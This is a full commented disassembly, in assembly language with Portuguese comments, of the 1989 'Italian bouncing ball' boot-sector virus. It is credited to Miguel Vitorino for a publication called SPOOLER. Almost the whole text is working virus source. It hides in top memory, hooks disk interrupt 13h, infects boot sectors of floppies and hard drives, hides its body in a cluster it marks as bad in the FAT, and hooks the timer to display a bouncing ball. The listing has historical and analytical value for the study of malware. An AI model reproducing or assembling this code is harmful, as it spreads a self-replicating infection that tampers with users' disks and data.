; **************************************************
; ***   VIRUS ITALIANO SALTITANTE - A LISTAGEM   ***
; *** Desassemblagem obtida por Miguel Vitorino  ***
; ***    Para : S P O O L E R - Junho de 1989    ***
; **************************************************

.RADIX 16

jmpf	macro	x
	db	0eah
	dd	x
endm

Virus       SEGMENT
assume	cs:virus;ds:virus

jmpf	MACRO	x
	db	0eah
	dd	x
ENDM

org 0100h

begin:	jmp	short entry

		db	1eh-2 dup (?)		; Informacao relativa a' disquete

entry:	xor	ax,ax
		mov	ss,ax
		mov	sp,7c00                 ; Colocar o Stack antes do inicio do
		mov	ds,ax				; virus 
		mov	ax,ds:[0413]           	; Retirar 2 K como se nao existissem
		sub	ax,2				; para que o DOS nao la' chegue !
		mov	ds:[0413],ax
		mov	cl,06                   ; Converter o tamanho da RAM num 
		shl	ax,cl                   ; numero de segmento que se situa nos
		sub	ax,07c0                 ; 2 ultimos K
		mov	es,ax                   ; De seguida passar este programa
		mov	si,7c00                 ; para esse sitio de memoria
		mov	di,si                   ; ( i.e. o programa transfere-se a si
		mov	cx,0100                 ;  proprio )
		repz	movsw	
		mov	cs,ax                   ; Transferencia de controlo para ai!
		push	cs                      ; Agora sim , ja' estamos nos tais 2K
		pop	ds
		call	reset                   ; fazer duas vezes um "reset" ao
reset:	xor	ah,ah                   ; controlador de disco
		int	13
		and	byte ptr ds:drive,80
		mov	bx,ds:sector		; Sector onde esta' o resto do virus
		push	cs
		pop	ax
		sub	ax,0020
		mov	es,ax
		call	ler_sector			; Ler o resto do virus da drive
		mov	bx,ds:sector
		inc	bx
		mov	ax,0ffc0			; Carregar o sector de boot original
		mov	es,ax
		call	ler_sector
		xor	ax,ax
		mov	ds:estado,al
		mov	ds,ax
		mov	ax,ds:[004c]		; "Confiscar" o interrupt 13
		mov	bx,ds:[004e]		; ( operacoes sobre disquetes/discos )
		mov	word ptr ds:[004c],offset int_13
		mov	ds:[004e],cs
		push	cs
		pop	ds
		mov	word ptr ds:velho_13,ax	; Guardar a velha rotina do int. 13
		mov	word ptr ds:velho_13+2,bx
		mov	dl,ds:drive
      	jmpf	0:7c00			; Efectuar o arranque do sistema

Esc_Sector	proc	near
		mov	ax,0301			; Escrever um sector da drive 
		jmp	short cs:transferir
Esc_Sector	endp

Ler_Sector	proc  near
            mov	ax,0201			; Ler um sector da drive
Ler_Sector	endp

Transferir  proc  near				; Efectuar uma transferencia de dados
      	xchg	ax,bx				; de ou para a drive
		add	ax,ds:[7c1c]            ; Este procedimento tem como entrada
		xor	dx,dx				; o numero do sector pretendido ( BX )
		div	ds:[7c18]               ; e de seguida sao feitas as contas 
		inc	dl				; para saber qual a pista e o lado 
		mov	ch,dl				; onde esse sector fica
		xor	dx,dx
		div	ds:[7c1a]
		mov	cl,06
		shl	ah,cl
		or	ah,ch
		mov	cx,ax
		xchg	ch,cl
		mov	dh,dl
		mov	ax,bx				; Depois de todas as contas feitas 
transf:	mov	dl,ds:drive			; pode-se chamar o interrupt 13H
		mov	bx,8000			; es:bx = end. de transferencia
		int	13
		jnb	trans_exit
		pop	ax
trans_exit:	ret	
Transferir	endp

Int_13	proc	near				; Rotina de atendimento ao int. 13H
		push	ds				; (operacoes sobre discos e disquetes)
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	cs
		pop	ds
		push	cs
		pop	es
		test	byte ptr ds:estado,1	; Testar se se esta' a ver se o virus
		jnz	call_BIOS			; esta' no disco
		cmp	ah,2
		jnz	call_BIOS
		cmp	ds:drive,dl			; Ver se a ultima drive que foi 
		mov	ds:drive,dl			; mexida e' igual a' drive onde
		jnz	outra_drv			; se vai mexer
		xor	ah,ah				; Neste momento vai-se tirar a' sorte
		int	1a				; para ver se o virus fica activo 
		test	dh,7f				; Isto e' feito a partir da leitura
		jnz	nao_desp			; da hora e se for igual a um dado
            test  dl,0f0			; numero , o virus e' despoletado
            jnz   nao_desp
            push  dx				; Instalar o movimento da bola
            call  despoletar
            pop   dx
nao_desp:	mov   cx,dx
            sub	dx,ds:semente
		mov	ds:semente,cx
		sub	dx,24
		jb	call_BIOS
outra_drv:	or	byte ptr ds:estado,1	; Indicar que se esta' a testar a 
		push	si				; presenca ou nao do virus na drive
		push	di
		call	contaminar
		pop	di
		pop	si
		and	byte ptr ds:estado,0fe	; Indicar fim de teste de virus
call_BIOS:	pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
Velho_13	equ	$+1
		jmpf	0:0
Int_13	endp

Contaminar	proc	near
		mov	ax,0201
		mov	dh,0
		mov	cx,1
		call	transf
		test	byte ptr ds:drive,80	; Pediu-se um reset a' drive ?
		jz	testar_drv			; Sim , passar a' contaminacao directa
		mov	si,81be
		mov	cx,4
proximo:	cmp	byte ptr [si+4],1
		jz	ler_sect
		cmp	byte ptr [si+4],4
		jz	ler_sect
		add	si,10
		loop	proximo
		ret

ler_sect:	mov	dx,[si]			; Cabeca+drive
		mov	cx,[si+2]			; Pista+sector inicial
		mov	ax,0201			; Ler esse sector
		call	transf
testar_drv:	mov	si,8002			; Comparar os 28 primeiros bytes para
		mov	di,7c02			; ver se o sector de boot e' o mesmo
		mov	cx,1c				; i.e. ver se a drive ja' foi virada !
		repz	movsb
		cmp	word ptr ds:[offset flag+0400],1357
		jnz	esta_limpa
		cmp	byte ptr ds:flag_2,0
		jnb	tudo_bom
		mov	ax,word ptr ds:[offset prim_dados+0400]
		mov	ds:prim_dados,ax		; Se chegar aqui entao a disquete ja'
		mov	si,ds:[offset sector+0400] ; esta' contaminada !
		jmp	infectar	
tudo_bom:	ret

; Neste momento descobriu-se uma disquete nao contaminada ! Vai-se agora 
; proceder a' respectiva contaminacao !

esta_limpa:	cmp	word ptr ds:[800bh],0200; Bytes por sector
		jnz	tudo_bom
		cmp	byte ptr ds:[800dh],2	; Sectores por cluster
		jb	tudo_bom
		mov	cx,ds:[800e]		; Sectores reservados
		mov	al,byte ptr ds:[8010]	; Numero de FAT's
		cbw
		mul	word ptr ds:[8016]	; Numero de sectores de FAT
		add	cx,ax
		mov	ax,' '
		mul	word ptr ds:[8011]	; Numero de entradas na root
		add	ax,01ff
		mov	bx,0200
		div	bx
		add	cx,ax
		mov	ds:prim_dados,cx
		mov	ax,ds:[7c13]		; Numero de sectores da drive
		sub	ax,ds:prim_dados
		mov	bl,byte ptr ds:[7c0dh]	; Numero de sectores por cluster
		xor	dx,dx
		xor	bh,bh
		div	bx
		inc	ax
		mov	di,ax
		and	byte ptr ds:estado,0fbh	; Se o numero de clusters dor superior
		cmp	ax,0ff0			; a 0FF0 entao cada entrada na FAT sao
		jbe	sao_3				; 4 nibbles senao sao 3
		or	byte ptr ds:estado,4	; 4 = disco duro ?
sao_3:	mov	si,1				; Escolher sector a infectar
		mov	bx,ds:[7c0e]		; Numero de sectores reservados
		dec	bx
		mov	ds:inf_sector,bx		; Sector a infectar
		mov	byte ptr ds:FAT_sector,0fe
		jmp	short continua

Inf_Sector	dw	1	; Sector a infectar
Prim_Dados  dw    0c    ; Numero do primeiro sector de dados
Estado	db	0	; Estado actual do virus (instalado/nao instalado,etc)
Drive		db	1	; Drive onde se pediu uma accao
Sector	dw	0ec	; Sector auxiliar para procura do virus
Flag_2	db	0	; Estes proximos valores servem para ver se o virus
Flag		dw	1357	; ja' esta' ou nao presente numa drive , bastando
		dw	0aa55 ; comparar se estes valores batem certos para o saber

continua:	inc	word ptr ds:inf_sector
		mov	bx,ds:inf_sector
		add	byte ptr ds:[FAT_sector],2
		call	ler_sector
		jmp	short	l7e4b

; Este pequeno pedaco de programa o que faz e' percorrer a FAT que ja' esta' na
; memo'ria e procurar ai um cluster livre para colocar nesse sitio o resto do 
; virus

verificar:	mov	ax,3				; Media descriptor + ff,ff
		test	byte ptr ds:estado,4	; disco duro ?
		jz	l7e1d
		inc	ax				; Sim , FAT comeca 1 byte mais adiante
l7e1d:	mul	si				; Multiplicar pelo numero do cluster
		shr	ax,1
		sub	ah,ds:FAT_sector
		mov	bx,ax
		cmp	bx,01ff
		jnb	continua
		mov	dx,[bx+8000]		; Ler a entrada na FAT
		test	byte ptr ds:estado,4
		jnz	l7e45
		mov	cl,4
		test	si,1
		jz	l7e42
		shr	dx,cl
l7e42:	and	dh,0f
l7e45:	test	dx,0ffff			; Se a entrada na FAT for zero,entao
		jz	l7e51				; descobriu-se um cluster para por o
l7e4b:	inc	si				; virus , senao passa-se ao proximo
		cmp	si,di				; cluster ate' achar um bom
		jbe	verificar
		ret

; Ja' foi descoberto qual o cluster a infectar ( registo BX ) , agora vai-se 
; proceder a' infeccao da disquete ou disco e tambem a' marcacao desse cluster
; como um "bad cluster" para o DOS nao aceder a ele

l7e51:	mov	dx,0fff7			; Marcar um "bad cluster" (ff7)
		test	byte ptr ds:estado,4	; Ver qual o tamanho das ents. na FAT
		jnz	l7e68				; ( 3 ou 4 nibbles )
		and	dh,0f
		mov	cl,4
		test	si,1
		jz	l7e68
		shl	dx,cl
l7e68:	or	[bx+8000],dx
		mov	bx,word ptr ds:inf_sector	; Infectar sector !!!
		call	esc_sector
		mov	ax,si
		sub	ax,2
		mov	bl,ds:7c0dh			; Numero de sectores por cluster
		xor	bh,bh
		mul	bx
		add	ax,ds:prim_dados
		mov	si,ax				; SI = sector a infectar
		mov	bx,0				; Ler o sector de boot original
		call	ler_sector
		mov	bx,si
		inc	bx
		call	esc_sector			; ... e guarda'-lo depois do virus
infectar:	mov	bx,si
		mov	word ptr ds:sector,si
		push	cs
		pop	ax
		sub	ax,20				; Escrever o resto do virus
		mov	es,ax
		call	esc_sector
		push	cs
		pop	ax
		sub	ax,40
		mov	es,ax
		mov	bx,0				; Escrever no sector de boot o virus
		call	esc_sector
		ret
Contaminar	endp

Semente	dw	?				; Esta word serve para fins de 
							; temporizacao da bola a saltar
FAT_sector	db    0				; Diz qual e' o numero do sector que
							; se esta' a percorrer quando se 
							; vasculha a FAT

Despoletar	proc	near				; Comecar a mostrar a bola no ecran
	      test  byte ptr ds:estado,2	; Virus ja' esta' activo ?
            jnz   desp_exit			; Sim ,sair
            or    byte ptr ds:estado,2	; Nao , marcar activacao
		mov	ax,0
		mov	ds,ax
		mov	ax,ds:20			; Posicionar interrupt 8 (relogio)
		mov	bx,ds:22
		mov	word ptr ds:20,offset int_8
		mov	ds:22,cs
		push	cs
		pop	ds				; E guardar a rotina anterior
		mov	word ptr ds:velho_8+8,ax
		mov	word ptr ds:velho_8+2,bx
desp_exit:	ret
Despoletar	endp

Int_8		proc	near				; Rotina de atendimento ao interrupt
	      push	ds				; provocado pelo relogio 18.2 vezes
		push	ax				; por segundo . Neste procedimento
		push	bx				; e' que se faz o movimento da bola
		push	cx				; pelo ecran
		push	dx
		push	cs
		pop	ds
		mov	ah,0f				; Ver qual o tipo de modo de video
		int	10
		mov	bl,al
		cmp	bx,ds:modo_pag		; Comparar modo e pagina de video com 
		jz	ler_cur			; os anteriores 
		mov	ds:modo_pag,bx		; Quando aqui chega mudou-se o modo
		dec	ah				; de video
		mov	ds:colunas,ah		; Guardar o numero de colunas
		mov	ah,1
		cmp	bl,7				; Comparar modo com 7 (80x25 Mono)
		jnz	e_CGA
		dec	ah
e_CGA:	cmp	bl,4				; Ve se e' modo grafico 
		jnb	e_grafico
		dec	ah
e_grafico:	mov	ds:muda_attr,ah
		mov	word ptr ds:coordenadas,0101
		mov	word ptr ds:direccao,0101
		mov	ah,3				; Ler a posicao do cursor
		int	10
		push	dx				; ... e guarda-la
		mov	dx,ds:coordenadas
		jmp	short	limites

ler_cur:	mov	ah,3				; Ler a posicao do cursor ...
		int	10
		push	dx				; ... e guarda-la
		mov	ah,2				; Posicionar o cursor no sitio da bola
		mov	dx,ds:coordenadas 
		int	10
		mov	ax,ds:carat_attr
		cmp	byte ptr ds:muda_attr,1
		jnz	mudar_atr
		mov	ax,8307			; Atributos e carater 7
mudar_atr:	mov	bl,ah				; Carregar carater 7 (bola) 
		mov	cx,1
		mov	ah,9				; Escrever a bola no ecran
		int	10
limites:	mov	cx,ds:direccao		; Agora vai-se ver se a bola esta' no
		cmp	dh,0				; ecran . Linha = 0 ?
		jnz	linha_1
		xor	ch,0ff			; Mudar direccao
		inc	ch
linha_1:	cmp	dh,18				; Linha = 24 ?
		jnz	coluna_1
		xor	ch,0ff			; Mudar direccao
		inc	ch
coluna_1:	cmp	dl,0				; Coluna = 0 ?
		jnz	coluna_2
		xor	cl,0ff			; Mudar direccao
		inc	cl
coluna_2:	cmp	dl,ds:colunas		; Colunas = numero de colunas ?
		jnz	esta_fixe
		xor	cl,0ff			; Mudar direccao
		inc	cl
esta_fixe:	cmp	cx,ds:direccao		; Mesma direccao ?
		jnz	act_bola
		mov	ax,ds:carat_attr
		and	al,7
		cmp	al,3
		jnz	nao_e
		xor	ch,0ff
		inc	ch
nao_e:	cmp	al,5
		jnz	act_bola
		xor	cl,0ff
		inc	cl
act_bola:	add	dl,cl				; Actualizar as coordenadas da bola
		add	dh,ch
		mov	ds:direccao,cx
		mov	ds:coordenadas,dx
		mov	ah,2
		int	10
		mov	ah,8				; Ler carater para onde vai a bola
		int	10
		mov	ds:carat_attr,ax
		mov	bl,ah
		cmp	byte ptr ds:muda_attr,1
		jnz	nao_muda
		mov	bl,83				; Novo atributo
nao_muda:	mov	cx,1
		mov	ax,0907			; Escrever a bola no ecran
		int	10
		pop	dx
		mov	ah,2				; Recolocar o cursor no posicao onde
		int	10				; estava antes de escrever a bola
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	ds
velho_8	equ	$+1
		jmpf	0:0
Int_8		endp

Carat_attr	dw	?	; 7fcd
Coordenadas	dw	0101  ; 7fcf
Direccao	dw	0101  ; 7fd1
Muda_attr	db	1	; 7fd3
Modo_pag	dw	?	; 7fd4
Colunas	db	?	; 7fd6

; Os bytes que se seguem destinam-se a reservar espaco para o stack

Virus		ENDS

END		begin
